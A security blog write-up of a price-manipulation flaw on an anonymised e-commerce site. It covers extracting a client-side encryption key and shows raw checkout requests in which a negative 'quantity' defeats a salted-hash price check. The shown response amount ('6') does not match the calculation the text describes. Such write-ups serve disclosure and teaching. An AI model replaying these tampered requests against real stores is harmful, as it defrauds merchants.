---
title: "Exploiting Business Logic Error: Price Manipulation"
layout: post
date: 2023-04-12 12:00
categories: blog
---

This blog discusses the exploitation of a business logic error that allows users to manipulate prices and pay less for the products and services offered by the target company.

## Target Background
The target of this analysis is a web application functioning as an e-commerce platform. It facilitates online purchases of various products and services by users.

## Overview
The Target company previously disclosed a vulnerability report regarding a specific issue: "hackers were able to manipulate the payment amount during the checkout/order process." To understand the application's fix for this vulnerability, I attempted the same steps to examine the implemented validation mechanisms.

## Reconnaissance
- Hosted on AWS
- Utilizes React for web application development
- Mobile application version is also available
- All application requests and responses are encrypted

## Finding the Encryption Key
Upon inspecting the application traffic, I discovered that the JSON payloads in requests and responses were encrypted. To manipulate or interact with these encrypted payloads, I needed to locate the encryption and decryption keys.

During my analysis of the JavaScript files, I identified the encryption key, the encryption algorithm, the mode, and the initialization vector. Armed with this information, I used online encryption tools to encrypt the payloads.

## Playing with fire🔥
I attempted to modify the price parameter in the request, but the application's validation mechanism prevented any successful manipulation. The amount to be paid was validated against a salted hash that was associated with the purchase order.

### Actual Request and Response

### Request

```http
POST /api/v1/checkout HTTP/2
Host: www.target.com
Cookie: blah...blah...blah...
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.target.com/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: iframe
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Te: trailers

{
  "saltedhash": "hashcode",
  "product_id": "121212",
  "price": "10",
  "quantity": "10",
  "address": "ABC city, ABC.",
  "zipcode": "123456"
}
```

### Response

```http
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: * 
Content-Type: application/json; charset=utf-8 
Set-Cookie: blah...blah...blah...; Path=/; HttpOnly 
X-Frame-Options: SAMEORIGIN 
X-Content-Type-Options: nosniff 
X-XSS-Protection: 1; mode=block 
Referrer-Policy: strict-origin-when-cross-origin 
Connection: close 
Strict-Transport-Security: max-age=31536000; includeSubDomains

{
  "saltedhash": "hashcode",
  "product_id": "121212",
  "price": "10",
  "quantity": "10",
  "amount_to_be_paid": "100",
  "address": "ABC city, ABC.",
  "zipcode": "123456"
}
```

The above request represents a checkout request sent to the server to facilitate payment for a purchase order. To address the previously exploited price manipulation vulnerability, the developer implemented an additional parameter named `saltedhash`.

## Bypass
During my exploration of the application flow and requests, I decided to conduct a deeper investigation of the `checkout` request. I noticed a parameter called `quantity`, which was responsible for creating orders based on the desired quantity specified by customers. I attempted to modify this value to a negative number.

### Manipulated Request

```http
POST /api/v1/checkout HTTP/2
Host: www.target.com
Cookie: blah...blah...blah...
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.target.com/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: iframe
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Te: trailers

{
  "saltedhash": "hashcode",
  "product_id": "121212",
  "price": "10",
  "quantity": "-5",
  "address": "ABC city, ABC.",
  "zipcode": "123456"
}
```

Upon sending the request with a negative value for the `quantity` parameter, the server responded by adjusting the amount to be paid accordingly. The lack of validation on the `quantity` parameter allowed negative values to be accepted. As a result, the backend calculation for the amount to be paid was based on the per-quantity price and the number of quantities in the cart.

### Response

```http
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: * 
Content-Type: application/json; charset=utf-8 
Set-Cookie: blah...blah...blah...; Path=/; HttpOnly 
X-Frame-Options: SAMEORIGIN 
X-Content-Type-Options: nosniff 
X-XSS-Protection: 1; mode=block 
Referrer-Policy: strict-origin-when-cross-origin 
Connection: close 
Strict-Transport-Security: max-age=31536000; includeSubDomains

{
  "saltedhash": "hashcode",
  "product_id": "121212",
  "price": "10",
  "quantity": "-5",
  "amount_to_be_paid": "6",
  "address": "ABC city, ABC.",
  "zipcode": "123456"
}
```

By changing the `quantity` value to a negative number, it was possible to pay a reduced amount for the orders placed.

Thanks for reading!

For more updates and insights, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).